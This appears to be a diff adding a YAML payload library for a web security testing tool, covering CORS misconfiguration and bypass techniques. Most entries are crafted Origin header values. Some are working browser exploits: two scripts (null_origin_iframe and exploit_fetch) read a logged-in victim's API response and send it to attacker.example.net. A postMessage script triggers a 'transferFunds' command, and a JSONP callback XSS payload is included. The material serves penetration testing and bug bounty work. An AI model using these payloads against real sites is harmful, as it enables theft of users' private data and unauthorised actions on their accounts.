@@ -1,0 +1,225 @@
+id: cors_bypass
+name: CORS Misconfiguration / Bypass
+version: 1.0.0
+category: misconfiguration
+description: |
+  Payloads to detect and exploit permissive CORS configurations: wildcards with
+  credentials, regex-bypass via null origin, subdomain trust, sibling-domain
+  trust, and protocol-downgrade origins. Use to confirm cross-origin data theft.
+mitre:
+  - T1538
+  - T1190
+owasp_top10:
+  - A05:2021
+references:
+  - https://portswigger.net/web-security/cors
+  - https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
+  - https://blog.detectify.com/2018/04/10/cors-misconfigurations-explained/
+related_tools:
+  - nuclei
+  - corsy
+  - corscanner
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: origin_reflection
+    name: Reflected Origin
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: https://attacker.example.net
+    notes: ACAO mirrors back; check ACAC=true
+    source: https://portswigger.net/web-security/cors
+  - id: null_origin
+    name: Null origin trust
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: null
+    notes: "Triggered from sandboxed iframe or data: URI"
+    source: https://portswigger.net/web-security/cors
+  - id: null_origin_iframe
+    name: Null origin via sandboxed iframe
+    subcategory: exploit_html
+    encoding: raw
+    tech_targets: [browser]
+    severity_when_works: high
+    payload: |
+      <iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>
+        fetch('https://target.example.net/api/me', {credentials:'include'})
+          .then(r=>r.text())
+          .then(t=>fetch('https://attacker.example.net/?d='+btoa(t)));
+      </script>"></iframe>
+    notes: Sandbox iframes have origin=null
+    source: https://portswigger.net/web-security/cors
+  - id: wildcard_subdomain
+    name: Wildcard subdomain trust
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: https://attacker.target.example.net
+    notes: When *.target.example.net regex accepts attacker subdomain
+    source: https://portswigger.net/web-security/cors
+  - id: prefix_suffix_bypass
+    name: Prefix bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: https://target.example.net.attacker.example.net
+    notes: When validator does endsWith on bare domain
+    source: https://blog.detectify.com/2018/04/10/cors-misconfigurations-explained/
+  - id: suffix_bypass
+    name: Suffix bypass with substring
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: https://attacker-target.example.net
+    notes: For startsWith / contains validators
+    source: common knowledge
+  - id: tld_swap
+    name: Trusted TLD swap
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Origin: https://target.example.com
+    notes: When regex `target\..*` accepts any TLD
+    source: https://blog.detectify.com/2018/04/10/cors-misconfigurations-explained/
+  - id: special_char_bypass
+    name: Special-char regex bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: https://target.example.net_.attacker.example.net
+    notes: Underscores etc. break naive regexes
+    source: common knowledge
+  - id: protocol_downgrade
+    name: HTTP protocol allowed
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Origin: http://target.example.net
+    notes: When HTTPS app trusts HTTP origin (MitM risk)
+    source: https://portswigger.net/web-security/cors
+  - id: file_protocol_origin
+    name: "file:// origin trust"
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Origin: file://
+    notes: "Some servers accept file:// as wildcard"
+    source: common knowledge
+  - id: punycode_bypass
+    name: IDN/punycode bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Origin: https://xn--trget-cqa.example.net
+    notes: Visually similar to target.example.net
+    source: common knowledge
+  - id: preflight_bypass_simple
+    name: Simple request avoids preflight
+    subcategory: technique
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Method=GET/POST/HEAD, Content-Type=text/plain | application/x-www-form-urlencoded | multipart/form-data, no custom headers
+    notes: Use for blind state-change CSRF when CORS isn't required
+    source: https://developer.mozilla.org/docs/Web/HTTP/CORS#simple_requests
+  - id: post_message_origin_check
+    name: postMessage missing origin check
+    subcategory: postmessage
+    encoding: raw
+    tech_targets: [browser]
+    severity_when_works: high
+    payload: |
+      <script>
+        var w = window.open('https://target.example.net/');
+        setTimeout(()=>w.postMessage({cmd:'transferFunds', to:'attacker'}, '*'), 3000);
+      </script>
+    notes: When listener doesn't verify event.origin
+    source: https://owasp.org/www-community/attacks/Cross-Site_Scripting_(XSS)#postMessage
+  - id: jsonp_callback_xss
+    name: JSONP callback XSS
+    subcategory: jsonp
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: /api/data?callback=alert(1)//
+    notes: When endpoint reflects callback as JS
+    source: https://owasp.org/www-community/attacks/Cross_Site_Scripting_(XSS)
+  - id: acac_true_with_wildcard
+    name: ACAO=* + ACAC=true (impossible but seen)
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Origin: https://attacker.example.net
+    notes: Some servers send both headers; browsers reject but server-to-server tools can still abuse
+    source: common knowledge
+  - id: exploit_fetch
+    name: Fetch exfil PoC
+    subcategory: exploit_html
+    encoding: raw
+    tech_targets: [browser]
+    severity_when_works: high
+    payload: |
+      <script>
+      fetch('https://target.example.net/api/me', {credentials:'include'})
+        .then(r=>r.text())
+        .then(t=>fetch('https://attacker.example.net/?d='+btoa(t)));
+      </script>
+    notes: Classic CORS PoC
+    source: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
+  - id: third_party_origin_dev
+    name: Trusted dev/staging origin
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Origin: https://localhost:3000
+    notes: Many APIs leave localhost/dev origins whitelisted in prod
+    source: common knowledge
+  - id: subdomain_takeover_chain
+    name: Subdomain takeover -> CORS bypass
+    subcategory: chained
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      Identify *.target.example.net dangling at a takeover-eligible provider, claim it, then send fetch from there.
+    notes: Pair with subdomain_takeover_fingerprints.yaml
+    source: https://blog.detectify.com/2018/04/10/cors-misconfigurations-explained/
+  - id: empty_origin
+    name: Empty Origin
+    subcategory: detection
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: low
+    payload: |
+      Origin:
+    notes: Test how server reacts to blank Origin
+    source: common knowledge
